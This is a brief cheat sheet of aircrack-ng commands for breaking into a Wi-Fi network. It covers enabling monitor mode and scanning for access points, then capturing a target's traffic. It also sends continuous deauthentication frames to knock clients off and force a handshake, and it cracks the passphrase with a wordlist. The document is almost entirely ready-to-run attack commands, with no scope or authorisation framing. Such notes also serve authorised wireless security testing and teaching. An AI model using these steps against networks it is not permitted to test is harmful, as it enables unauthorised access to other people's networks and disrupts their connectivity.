# Dictionary
	*BSSID*: Basic Service Set Identifier
	*ESSID*: Extended Service Set Identifier
	Master key
	Transient key
	EAPOL HMAC
# List all wireless interfaces
	$ iwconfig
		// lo: local loopback

# Kill any disturbing processes.

	$ sudo airmon-ng check kill

# Start monitor mode on the internet adapter
	$ sudo airmon-ng start <monitor_interface>

	Example for monitor_interface:
		wlp1s0
		wlan

# Scan for Wifi Router Access Point BSSID (MAC address) and channel

	$ sudo airodump-ng <monitor_interface>

# Logging files 
	
	$ sudo airodump-ng -w <log_file_name> -c <channel_numer> --bssid <bssid> <monitor_interface>

# Send de-authentication token

	$ sudo aireplay-ng --deauth 0 -a <bssid> <monitor_interface>

# Search for passcode in word lists. 

	$ aircrack-ng <log_file_name> -w <wordlist>

# Stop a monitoring interface
	$ sudo airmon-ng stop <monitor_interface>

# Restart wifi network
	$ sudo service network-manager restart
